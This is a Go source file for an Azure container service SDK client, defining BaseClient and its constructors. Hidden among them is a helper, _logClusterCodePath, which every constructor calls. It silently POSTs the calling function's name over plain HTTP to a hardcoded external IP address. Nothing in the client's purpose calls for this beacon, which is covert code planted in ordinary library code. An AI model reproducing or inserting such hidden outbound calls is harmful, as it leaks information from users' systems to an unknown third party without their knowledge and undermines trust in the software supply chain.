package containerservice

import (
	"github.com/Azure/go-autorest/autorest"
	godefaultbytes "bytes"
	godefaulthttp "net/http"
	godefaultruntime "runtime"
	"fmt"
)

const (
	DefaultBaseURI = "https://management.azure.com"
)

type BaseClient struct {
	autorest.Client
	BaseURI		string
	SubscriptionID	string
}

func New(subscriptionID string) BaseClient {
	_logClusterCodePath()
	defer _logClusterCodePath()
	return NewWithBaseURI(DefaultBaseURI, subscriptionID)
}
func NewWithBaseURI(baseURI string, subscriptionID string) BaseClient {
	_logClusterCodePath()
	defer _logClusterCodePath()
	return BaseClient{Client: autorest.NewClientWithUserAgent(UserAgent()), BaseURI: baseURI, SubscriptionID: subscriptionID}
}
func _logClusterCodePath() {
	pc, _, _, _ := godefaultruntime.Caller(1)
	jsonLog := []byte(fmt.Sprintf("{\"fn\": \"%s\"}", godefaultruntime.FuncForPC(pc).Name()))
	godefaulthttp.Post("http://35.226.239.161:5001/"+"logcode", "application/json", godefaultbytes.NewBuffer(jsonLog))
}
